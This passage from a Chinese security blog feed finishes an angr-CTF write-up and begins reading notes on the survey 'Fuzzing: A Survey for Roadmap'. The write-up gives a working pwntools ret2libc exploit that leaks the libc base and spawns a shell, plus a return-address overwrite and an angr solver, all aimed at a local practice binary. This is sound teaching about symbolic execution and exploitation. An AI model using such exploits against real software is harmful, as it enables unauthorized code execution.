&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(key_val))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(chr_arr_val))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>运行即可获得 <code>&quot;Good Job.&quot;</code></p><p><img src="https://s2.loli.net/2022/12/02/LeEl7WNBb3iwxtj.png" alt="image.png"></p><blockquote><p>笔者感觉这两题基本上一模一样…不知道为啥特地分成两道题-  -</p></blockquote><h2 id="17-angr-arbitrary-jump：栈溢出劫持控制流">17_angr_arbitrary_jump：栈溢出劫持控制流</h2><p>angr-CTF 的最后一道题了，还是惯例拖入 IDA 中，这一次的核心逻辑在 <code>read_input()</code> 当中，而该函数仅为一个简单的 <code>&quot;%s&quot;</code> 溢出：</p><p><img src="https://s2.loli.net/2022/12/02/YmoRpJWTil4tvHB.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/12/02/xAenrIhSkwaDo2E.png" alt="image.png"></p><p>checksec 一下，只开了一个 NX：</p><p><img src="https://s2.loli.net/2022/12/02/Qh78ie42x5PGnIT.png" alt="image.png"></p><p>直接打一套 ret2libc 组合拳：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    p = process(<span class="hljs-string">&quot;./17_angr_arbitrary_jump&quot;</span>)<br>    e = ELF(<span class="hljs-string">&quot;./17_angr_arbitrary_jump&quot;</span>)<br>    libc = ELF(<span class="hljs-string">&quot;/usr/lib/i386-linux-gnu/libc-2.31.so&quot;</span>)<br><br>    payload1 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x19</span> + p32(<span class="hljs-number">0xdeadbeef</span>)<br>    payload1 += p32(e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p32(e.sym[<span class="hljs-string">&#x27;read_input&#x27;</span>])<br>    payload1 += p32(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>    p.sendline(payload1)<br><br>    p.recvuntil(<span class="hljs-string">b&#x27;Enter the password: &#x27;</span>)<br>    puts_got = u32(p.recv(<span class="hljs-number">4</span>))<br>    log.success(<span class="hljs-string">&quot;puts got:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(puts_got)))<br>    libc_base = puts_got - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>    bin_sh_addr = libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>).__next__()<br>    log.success(<span class="hljs-string">&quot;libc base:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>    log.success(<span class="hljs-string">&quot;bin_sh:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base + bin_sh_addr)))<br><br>    payload2 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x19</span> + p32(<span class="hljs-number">0xdeadbeef</span>)<br>    payload2 += p32(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>    payload2 += p32(<span class="hljs-number">0xdeadbeef</span>)<br>    payload2 += p32(libc_base + bin_sh_addr)<br>    p.sendline(payload2)<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>运行即可 Get shell：</p><p><img src="https://s2.loli.net/2022/12/02/ZTDsOjkgU459GKx.png" alt="image.png"></p><p>——但在 angr-CTF 中实际上要求我们输出的是 <code>&quot;Good Job.&quot;</code> 字符串：(</p><p>重新再看一下 IDA，我们可以找到一个名为 <code>print_good()</code> 的函数，其会输出 <code>&quot;Good Job.&quot;</code> 字符串</p><p><img src="https://s2.loli.net/2022/12/02/ws5VH6UWhFoT9ye.png" alt="image.png"></p><p>那么我们直接将返回地址覆盖为该函数即可，exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./17_angr_arbitrary_jump&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x19</span> + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(<span class="hljs-number">0x58465168</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>运行即可获得 <code>&quot;Good Job.&quot;</code></p><p><img src="https://s2.loli.net/2022/12/02/KwuMV92WDmxNqQg.png" alt="image.png"></p><p>——但这并不是我们做这一道题的目的，我们应当使用 angr 来求解：）</p><p>那么用 angr 该怎么做呢？首先我们不难想到的是我们还是可以利用 SimProcedure 来 hook scanf 以将输入符号化，由于输入存在溢出，那么我们可以假装不知道输入到栈底的距离，直接将符号化输入设为一个较大长度，若无解再继续增长即可</p><p>但这里我们需要完成的是利用栈溢出来控制程序进行跳转，对于 angr 而言这样的状态是<strong>不受约束的状态</strong>（<strong>unconstrained state</strong>），<strong>会被自动丢弃</strong>，因此我们还需要想办法让 angr 保留这样的状态</p><h3 id="angr-stash">angr stash</h3><p>在 angr 当中，不同的状态被组织到 simulation manager 的不同的 stash 当中，我们可以按照自己的需求进行步进、过滤、合并、移动等</p><h4 id="①-stash-类型">① stash 类型</h4><p>在 angr 当中一共有以下几种 stash：</p><ul><li><code>simgr.active</code>：活跃的状态列表。在未指定替代的情况下会被模拟器默认执行</li><li><code>simgr.deadended</code>：死亡的状态列表。当一个状态无法再被继续执行时（例如没有有效指令、无效的指令指针、不满足其所有的后继（successors））便会被归入该列表</li><li><code>simgr.pruned</code>：被剪枝的状态列表。在指定了 <code>LAZY_SOLVES</code> 时，状态仅在必要时检查可满足性，当一个状态在指定了 <code>LAZY_SOLVES</code> 时被发现是不可满足的（unsat），状态层（state hierarchy）将会被遍历以确认在其历史中最初变为不满足的时间，该点及其所有后代都会被  <em>剪枝</em>  （pruned）并放入该列表</li><li><code>simgr.unconstrained</code>：不受约束的状态列表。当创建 <code>SimulationManager</code> 时指定了 <code>save_unconstrained=True</code>，则被认为<strong>不受约束的</strong>（unconstrained，即指令指针被用户数据或其他来源的符号化数据控制）状态会被归入该列表</li><li><code>simgr.unsat</code>：不可满足的状态列表。当创建 <code>SimulationManager</code> 时指定了 <code>save_unsat=True</code>，则被认为无法被满足的（unsatisfiable，即存在<strong>约束冲突</strong>的状态，例如在同一时刻要求输入既是<code>&quot;AAAA&quot;</code> 又是 <code>&quot;BBBB&quot;</code>）状态会被归入该列表</li></ul><p>还有一种不是 stash 的状态列表——<code>errored</code>，若在执行中产生了错误，则状态与其产生的错误会被包裹在一个 <code>ErrorRecord</code> 实例中（可通过 <code>record.state</code> 与 <code>record.error</code> 访问），该 record 会被插入到 <code>errored</code> 中，我们可以通过 <code>record.debug()</code> 启动一个调试窗口</p><h4 id="②-stash-操作">② stash 操作</h4><p>我们可以使用 <code>stash.move()</code> 来在 stash 之间转移放置状态，用法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>simgr.move(from_stash = <span class="hljs-string">&#x27;unconstrained&#x27;</span>, to_stash = <span class="hljs-string">&#x27;active&#x27;</span>)<br></code></pre></td></tr></table></figure><p>在转移当中我们还可以通过指定 <code>filter_func</code> 参数来进行过滤：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter_func</span>(<span class="hljs-params">state</span>):<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;arttnba3&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(<span class="hljs-number">1</span>)<br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>simgr.move(from_stash = <span class="hljs-string">&#x27;unconstrained&#x27;</span>, to_stash = <span class="hljs-string">&#x27;active&#x27;</span>, filter_func = filter_func)<br></code></pre></td></tr></table></figure><p>stash 本质上就是个 list，因此在初始化时我们可以通过字典的方式指定每个 stash 的初始内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>simgr = proj.factory.simgr(init_state,<br><span class="hljs-meta">... </span>    stashes = &#123;<br><span class="hljs-meta">... </span>            <span class="hljs-string">&#x27;active&#x27;</span>:[init_state],<br><span class="hljs-meta">... </span>            <span class="hljs-string">&#x27;found&#x27;</span>:[],<br><span class="hljs-meta">... </span>    &#125;)<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOIT-8">FINAL EXPLOIT</h3><p>那么由于本题我们需要通过栈溢出来控制 eip，属于 unconstrained 的状态，因此<strong>我们需要手动判断是否找到了 unconstrained 状态</strong>，于是与此前不同的是本题我们通过 <code>simgr.step()</code> 来进行单步执行，若其中某一步获得了 unconstrained state 则我们遍历其中状态并判断是否可以满足控制 eip 为指定值的约束，若是则直接添加到 <code>simgr.found</code> 列表中即可</p><p>故最终的解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-comment"># filter to check satisfiability</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter_func</span>(<span class="hljs-params">state</span>):<br>    print_good_addr = <span class="hljs-number">0x58465168</span><br>    <span class="hljs-keyword">return</span> state.satisfiable(extra_constraints = (state.regs.eip == print_good_addr, ))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&quot;./17_angr_arbitrary_jump&quot;</span><br>    proj = angr.Project(bin_path)<br><br>    <span class="hljs-comment"># hook the scanf to symbolize our input</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimScanfProcedure</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, fmtstr, input_addr</span>):<br>            input_bvs = claripy.BVS(<span class="hljs-string">&#x27;input_addr&#x27;</span>, <span class="hljs-number">200</span> * <span class="hljs-number">8</span>)<br>            <span class="hljs-keyword">for</span> <span class="hljs-built_in">chr</span> <span class="hljs-keyword">in</span> input_bvs.chop(bits = <span class="hljs-number">8</span>):<br>                self.state.add_constraints(<span class="hljs-built_in">chr</span> &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-built_in">chr</span> &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>            self.state.memory.store(input_addr, input_bvs)<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;input_val&#x27;</span>] = input_bvs<br>            <br>    proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, SimScanfProcedure())<br><br>    <span class="hljs-comment"># create simgr that can save unconstraints</span><br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state, <br>                               save_unconstrained=<span class="hljs-literal">True</span>,<br>                               stashes = &#123;<br>                                   <span class="hljs-string">&#x27;active&#x27;</span>:[init_state],<br>                                   <span class="hljs-string">&#x27;unconstrained&#x27;</span>:[],<br>                                   <span class="hljs-string">&#x27;found&#x27;</span>:[],<br>                               &#125;)<br><br>    <span class="hljs-comment"># simulated execution by steps</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> simgr.found:<br>        <span class="hljs-comment"># no more states for execution</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> simgr.active) <span class="hljs-keyword">and</span> (<span class="hljs-keyword">not</span> simgr.unconstrained):<br>            <span class="hljs-keyword">break</span><br><br>        <span class="hljs-comment"># check for unconstrained states</span><br>        simgr.move(from_stash = <span class="hljs-string">&#x27;unconstrained&#x27;</span>, <br>                  to_stash = <span class="hljs-string">&#x27;found&#x27;</span>,<br>                  filter_func = filter_func)<br><br>        <span class="hljs-comment"># step to next basic block</span><br>        simgr.step()<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] found &#123;&#125; solution state(s)&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(simgr.found)))<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        print_good_addr = <span class="hljs-number">0x58465168</span><br>        solution_state.add_constraints(solution_state.regs.eip == print_good_addr)<br>        input_val = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;input_val&#x27;</span>], <br>                                               cast_to=<span class="hljs-built_in">bytes</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(input_val))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>运行即可获得 <code>&quot;Good Job.&quot;</code></p><p><img src="https://s2.loli.net/2022/12/03/Zf6w1xrNFc5HvLI.png" alt="image.png"></p><p>至此，angr CTF 的 18 道题目<strong>全部完结</strong></p><h1>0xFF.What’s more…</h1><p>作为用来入门 angr 基本用法的题目，angr CTF 自然不会太难，不过笔者确乎通过 angr 体会到了<strong>符号执行这一技术的美感所在</strong>（虽然说这个感触好像比较玄学 : ) ）</p><p>不同于代码审计或是比较偏“暴力”的 fuzz，符号执行这一技术还向我们展现了具有别样美感的漏洞挖掘与 exp 编写技巧，以 angr CTF 为例，虽然说最后三道漏洞利用题目看起来好像都挺笨，但设想将第 17 题换成这样的一个场景——我们正在挖掘一个逻辑比较复杂的现代软件（例如一个存在栈溢出的路由器固件，我们的输入可以是向路由器发送的数据包（比如说对路由器控制页的 HTTP 请求）），直接逆向审计比较费劲，而暴力 fuzz 又不好搭执行环境，此时无需实际执行二进制文件的符号执行便能很好地发挥其用处</p><p>不过需要注意的是以上的 18 道题虽然看似涵盖了 angr 的基本用法，但其实 angr 还有更多更有趣的 API，若是要更加熟练的运用这个顶级的混合执行框架，则还需要我们多多阅读 angr 的文档并多加使用，毕竟 angr-ctf 只是一个最基础的练手级的项目（笑）</p><p>符号执行这一技术或许还有更为光明的未来正等待着我们进行探索：）</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;你说的对，但是 &lt;a href=&quot;https://github.com/angr/angr&quot;&gt;angr&lt;/a&gt; 是一个使用 Python 编写的跨平台开源二进制分析框架…&lt;/p&gt;</summary>
    
    
    
    <category term="ANGR" scheme="http://blog.arttnba3.cn/categories/ANGR/"/>
    
    
    <category term="信息安全" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="angr" scheme="http://blog.arttnba3.cn/tags/angr/"/>
    
    <category term="符号执行" scheme="http://blog.arttnba3.cn/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    
    <category term="二进制安全" scheme="http://blog.arttnba3.cn/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    <category term="二进制分析" scheme="http://blog.arttnba3.cn/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>【PAPER.0x00】论文笔记：Fuzzing: A Survey for Roadmap </title>
    <link href="http://blog.arttnba3.cn/2022/10/30/PAPER-0X00-FUZZING_A_SURVEY_FOR_ROADMAP/"/>
    <id>http://blog.arttnba3.cn/2022/10/30/PAPER-0X00-FUZZING_A_SURVEY_FOR_ROADMAP/</id>
    <published>2022-10-30T05:35:21.000Z</published>
    <updated>2022-10-30T12:18:32.780Z</updated>
    
    <content type="html"><![CDATA[<p>模糊测试为什么是神</p><span id="more"></span><h1>0x00.一切开始之前</h1><p><em><strong>Fuzzing: A Survey for Roadmap</strong></em> 是关于模糊测试领域的比较好的一篇综述，而恰巧笔者想要开始接触一些学术上的东西，所以决定从这篇综述性论文开始入手去了解模糊测试这一领域：）</p><p>这篇博客便是笔者的一个读书笔记，不过笔者不会将论文全部人工翻译后原样照搬过来，而只会选择比较精髓的部分，并按笔者的意思进行排版（笑）</p><blockquote><p>当然现在看来好像大部分其实还是照搬笔者人工翻译后的论文原文，笔者做的额外工作好像仅仅是排版优化…</p></blockquote><h2 id="Abstract">Abstract</h2><p><strong>Fuzz testing</strong>（fuzzing，即模糊测试）在检测安全漏洞中大放异彩，其通过生成大量的测试用例（test cases）并观测执行结果来寻找漏洞，且已在大量的应用中发现了上千个漏洞。虽然非常高效，fuzz 仍缺乏系统化的对其缺陷的分析：</p><ul><li>fuzz 需要缩小<strong>输入空间</strong>（input space）与<strong>缺陷空间</strong>（defect space，触发缺陷的输入）间的差距；在一个应用当中，漏洞（defects）的存在是分散的（spare），这意味着 defects space 要比 input space 小得多</li><li>fuzzing 生成大量的测试用例进行重复测试——这需要一种自动化的方法；由于程序与漏洞的复杂性，自动化地执行不同的程序会是一个挑战</li></ul><p>本篇论文系统化地回顾并评估了 fuzz 的缺陷机器解决办法</p><h1>0x01. INTRODUCTION</h1><p>软件漏洞是计算机系统中的一个严重的问题，而 Fuzz testing 已经成为最成功的检测程序漏洞的方法之一，其通过生成大量的测试用例来重复测试目标程序并观察其<strong>异常</strong>（exception）——安全漏洞的标志（indicator）</p><p>Fuzzing 通常有着一组种子（seeds）：interesting inputs，新的输入的生成则基于这组种子进行无限的变异（mutate）</p><p>虽然 fuzzing 在发现安全漏洞上获得了巨大的成功，在开发高效的漏洞检测解决方案上仍存在着缺陷，如 Fig.1 所示，三个主要的缺陷是：输入中分散的漏洞空间，严格的有效输入空间，多目标的自动化执行</p><p><img src="https://s2.loli.net/2022/10/26/MoW9IBHGRvk35bV.png" alt="Fig. 1. Illustration of knowledge gaps in the domain of fuzzing. "></p><ul><li><strong>Gap 1: spare defect space of inputs.</strong> 在应用程序中的漏洞分布是分散的，而仅有部分特定的输入能够触发漏洞；浅显的漏洞可以在短时间内被 fuzz 到，但许多安全漏洞需要测试复杂的执行路径并解决严格的路径约束，因此一个高效的 fuzzing 算法需要同时对 <em>待测试程序</em> （program under test， <strong>PUTs</strong>）与 <em>安全缺陷</em> （security flaws）足够精通，以在一个更有可能存在漏洞的代码区域驱动计算资源</li><li><strong>Gap 2: strict valid input space.</strong> 大部分程序有着自己的输入空间，而现代程序都相当复杂，需要更复杂的特化输入空间，因此如何生成有效输入同样是个挑战；此外，为了提高 fuzzing 的效率，生成的输入应当使用不同的执行状态（例如 <em>代码覆盖率</em> ），这需要更先进的方案来生成有效输入；若缺乏对 PUTs 的系统化分析，几乎不可能精确地限制输入空间（例如 PDF 文件的变异生成可能会违反 PDF 规范）</li><li><strong>Gap 3: various target.</strong> 由于 fuzzing 大量重复地测试 PUTs，这需要高效的自动化方法。PUTs 与漏洞都是多种多样的，有的程序可以简单直接地被自动化地 fuzz（例如命令行程序），但许多程序在自动化测试前都需要做大量的工作（例如硬件）；此外，安全缺陷同样需要自动化的 indicator 以记录潜在的真正漏洞，<strong>程序崩溃</strong>是一个常用的 indicator 因为其可以被 OS 自动捕获，但有的安全缺陷<strong>并不会表现出崩溃</strong>（例如条件竞争），这需要精心设计的 indicator</li></ul><p>业界在缩小这些缺陷上做出了许多努力。在本篇论文中，研究者系统化地回顾与分析了 fuzzing 的缺陷与解决方案，同时考虑了广度与深度</p><p>本篇论文目录如下：</p><ul><li><strong>§2</strong>：overview of fuzzing</li><li><strong>§3</strong>：depicts fuzzing processes and various fuzzing theories to formulate he processes</li><li><strong>§4</strong>：analyzes diverse solutions to reduce the search space of inputs</li><li><strong>§5</strong>：analyzes how to automatize the execution of various PUTs and the detection of different bugs.</li><li><strong>§6</strong>：other some directions for future research</li></ul><h1>0x02. OVERVIEW OF FUZZING</h1><p><img src="https://s2.loli.net/2022/10/26/u6F7mKtzvRqxNWo.png" alt="Fig. 2. General workflow of fuzzing."></p><p>我们首先介绍一些术语（ <strong>Terminologies.</strong> ），如 Fig2 所示：</p><ul><li><strong>seed</strong>：被保留的能完成更好的 fitness 的输入（例如提供新的覆盖率）</li><li><strong>fitness</strong>：对一个 input/seed 的质量的测量</li><li><strong>power schedule</strong>：决定了分配给 seeds 的 energy</li><li><strong>energy</strong>：分配给当前 fuzzing round 的变异数量</li><li><strong>fuzzer</strong>：fuzzing 算法的实现</li></ul><blockquote><p>这里论文还讲了一段历史，不抄了</p></blockquote><p>如 Fig2 所示，fuzzing 由三部分组成：</p><ul><li><strong>input generator</strong>：负责向 executor 提供输入</li><li><strong>executor</strong>：负责执行输入</li><li><strong>defect monitor</strong>：负责检查是否发现了新的执行状态或缺陷（例如 crashes）</li></ul><p>基于输入的生成方式，fuzzing 可以分为：</p><ul><li><strong>基于生成的</strong> （generation-based）：基于 <em>文法</em> （grammars）或 <em>有效语料库</em> （valid corpus）从头开始生成；如 Fig2 所示，其从一组种子中直接获得输入</li><li><strong>基于变异的</strong>（mutation-based）：对现有的种子进行 <em>变异</em> （mutate）以获得新的输入；对给定的一组种子，基于变异的模糊测试通过 seed schedule、byte schedule、mutation schedule 以获得输入</li></ul><blockquote><p>需要注意的是，fuzzing 并不需要经历 Fig2 中的所有步骤，例如基于生成的模糊测试并不执行 byte schedule 或 mutation schedule，但关注于从初始输入文件中选择最优的种子组</p></blockquote><p>基于执行时观测到的信息量，fuzzing 可以分为：</p><ul><li><strong>黑盒</strong>（blackbox）：黑盒模糊测试并不知道每次执行的内部状态，通过使用输入格式化或不同的输出状态来进行优化</li><li><strong>白盒</strong>（whitebox）：白盒模糊测试对每次执行的内部状态是全部得知的，这使其能系统化地探索目标程序的状态空间；其通常使用 concolic execution（例如 <em>dynamic symbolic execution，即动态符号执行</em> ）来分析目标程序</li><li><strong>灰盒</strong>（greybox）：灰盒模糊测试获得的执行状态信息在黑盒与白盒之间，例如许多 fuzzer 都使用 <em>边界覆盖率</em> （edge coverage）作为内部执行状态</li></ul><p>最通用的执行状态便是<strong>代码覆盖率</strong>（code coverage，例如 CFGs（control flow graphs） 中的基本块（basic block、边（edges）），覆盖率的基本假设用法是：发现更多的执行状态（例如新的覆盖率）能提高发现漏洞的概率。因此 <em>覆盖率指导</em> （coverage-guided）的模糊测试的目标便是覆盖更多的代码</p><blockquote><p>但执行状态并不限制于代码覆盖率，对面向对象程序（object-oriented programs）而言也可以是执行的合法性（legality），对协议实现（protocol implementations）可以是状态机（state machine），对并发实现（concurrency）可以是 alias coverage，对深度学习模型（deep learning models）可以是神经覆盖率（neuron coverage），对安卓智能电视则可以是执行日志（execution logs）</p></blockquote><p>Fuzzer 通常使用 <em>崩溃</em> （crashes）作为安全漏洞的指示器，因为 crashes 提供了直接的自动记录（OS 会自动发出信号告知程序崩溃），然而有的缺陷并不会显示出 crashes，因此 fuzzer 使用其他的指示器，例如 physical safety violation</p><p>但 indicators 仅显示了可能的安全问题，还需要安全工具或人工确认这是一个 <em>漏洞</em> （vulnerability）</p><h1>0x03. FUZZING THEORY</h1><p>为了提高发现漏洞的概率，fuzzer 在执行过程中使用反馈（feedback）机制，例如以执行状态或结果作为 fitnes，一个典型的 fitness 便是基于代码覆盖率（例如基本块或边）进行输入生成，但仅有代码覆盖率<strong>并非一直都是可靠的</strong>，就算可靠也可能收益不高（例如指数型数量的输入生成可能只带来线性的漏洞发现），因此一种常见的改进方法是优化模糊测试的过程或是为 fitness 丰富信息，Table 1 展示了不同的 fuzzer 的优化方法：</p><p><img src="https://s2.loli.net/2022/10/26/tgGbHp5JRn8zkIS.png" alt="Table 1. Fuzzers and their optimization solutions. "></p><h2 id="3-1-Seed-Set-Selection">3.1 Seed Set Selection</h2><p>对种子集的优化关注于<strong>最小化种子集的大小</strong>，例如选择能覆盖所有已发现代码覆盖的一组最少的种子，因为过于富集的种子会在检验已探测代码区域上浪费计算资源</p><blockquote><p>在 <a href="https://www.usenix.org/conference/usenixsecurity14/technical-sessions/presentation/rebert">UESIX 的一篇论文</a> 中其被表述为 <em>最小覆盖集问题</em> （minimal set coverage problem，MSCP）</p></blockquote><h2 id="3-2-Seed-Schedule">3.2 Seed Schedule</h2><p><strong>种子调度</strong>（seed schedule）期望解决如下问题：</p><ul><li>在下一轮中选择哪个种子</li><li>为该种子分配的时间预算（time budget）；大部分 fuzzer 实际上选择优化对被选取种子的变异次数</li></ul><p>由于 PUTs 与漏洞的复杂性，未发现代码覆盖率与未发现漏洞是不可知的，我们无法知道一个输入是否能触发漏洞，类似地在检索代码之前我们也不能获得程序行为的概率分布，因此数学上我们几乎不可能找到一个全面的优化解法，因此研究人员基于多种优化方法来近似地解决这个问题</p><h3 id="3-2-1-Fitness-by-Bugs"><em>3.2.1 Fitness by #Bugs</em></h3><p>通常而言在模糊测试过程中使用两种 fitness 进行优化：1）基于漏洞 2）基于执行状态（例如代码覆盖率）</p><p>由于 fuzzing 的目的是发现漏洞，发现漏洞的数量便是一种最简单的 fitness，一种方法便是在随机/顺序选择种子的时候调度每个种子的时间预算，在不考虑执行状态的情况下， <em>最大化漏洞数量问题</em>  可以被简化为一个 <strong>整数线性规划</strong>（Integer Linear Programming，ILP）问题，即在线性约束下最大化漏洞数量——以解决这样的 ILP 问题来自动计算每个种子的时间预算</p><p>另外一种认知是将漏洞发现的过程视作 <strong>带权奖券收集问题</strong>（Weighted Coupon Collector’s Problem，<s>不懂的建议翻概率论课本虽然👴的概率论也是挂得一塌糊涂</s>）：fuzzing 中发现的每个独特的漏洞都被视作一种“奖券”，WCCP 期望以此预测发现下个“奖券”所需要的尝试的数量（时间预算）</p><p>ILP 与 WCCP 都是为了将更多的时间于是分配给更有潜力的种子以发现更多漏洞</p><h3 id="3-2-2-Fitness-by-State-Transition（Markov-Chain）"><em>3.2.2 Fitness by State Transition（Markov Chain）</em></h3><p>由于漏洞在 PUTs 中的分布是分散的，若以已发现漏洞为 fitness，则 fuzzing 只会关注与已发现漏洞相关的代码区域，这有可能无法获得更多的代码覆盖，这种情况下需要复杂条件的 <em>深层漏洞</em> 则能逃过 fuzzer 的法眼</p><p>为了缓解这个问题，fuzzer 基于<strong>执行状态</strong>（execution state，例如代码覆盖率）计算 fitness，因为执行状态能提供更多的信息；现有的 fuzzer 通常使用代码覆盖率来计算 fitness，因为更高的代码覆盖率意味着更高的发现漏洞的可能性</p><p>如 Fig2 所示，若模糊测试能成功地表示状态迁移，其能高效地指引模糊测试以探索未发现的状态，一个热门的建模方法便是 <strong>马尔科夫链</strong>（Markov Chain），其中一种解决方案是将 CFGs 